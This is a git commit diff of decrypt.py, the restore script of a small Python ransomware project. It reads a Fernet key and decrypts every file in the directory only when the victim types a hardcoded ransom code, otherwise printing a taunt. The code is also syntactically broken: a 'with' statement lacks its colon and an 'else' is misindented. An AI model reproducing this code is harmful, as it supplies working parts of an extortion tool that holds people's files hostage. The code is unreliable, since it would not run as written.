e8061e178a5a29d8e462937a9de9d4ff1f01b5aa
Marc <76431323+DrGeekthumb@users.noreply.github.com>
2023-08-24 13:00:49 +0100

    Rewritten and comments added

--- decrypt.py
+++ decrypt.py
@@ -1,33 +1,33 @@
 #!/usr/bin/env python3
 
-# Based on original concept by Network Chuck
-
-
 import os
 from cryptography.fernet import Fernet
 
-# Iterate through each file except encrypter and decryption key
 
 files = []
-
+# Iterate through each file except encryption and decryption scripts, and the decryption key file
 for file in os.listdir():
-	if file =="cryptor.py" or file == "decrypt.key" or file == "decrypt.py":
+	if file =="encrypt.py" or file == "key.txt" or file == "decrypt.py":
 		continue
-	if os.path.isfile(file):
+	if os.path.isfile(file): # checks if item is a file not a folder and adds it to the files array
 		files.append(file)
 
-print(files)
-
-key = Fernet.generate_key()
 
 
+with open("key.txt", "rb") as key
+	ransomkey = key.read() # Read the decryption key from key.txt and save in a new variable called ransomkey
 
-with open("decrypt.key", "rb") as key
-	ransomkey = key.read()
+decryptcode = "lasershark"
 
-for file in files:
-	with open(file, "rb") as thefile:
-		contents = thefile.read()
-	contents_decrypted = Fernet(ransomkey).decrypt(contents)
-	with open(file, "wb") as thefile:
-		thefile.write(contents_decrypted)
+userinput = input ("Enter the decryption code to restore your files:\n")
+
+if userinput == decryptcode:
+    for file in files:
+        with open(file, "rb") as thefile:
+            contents = thefile.read() # Open each file and read the contents
+        contents_decrypted = Fernet(ransomkey).decrypt(contents) # Decrypt the contents of the file using the key
+        with open(file, "wb") as thefile:
+            thefile.write(contents_decrypted) # write the decrypted contents back into the file
+    print("Your files have been decrypted")
+ else:
+    print("How about no")
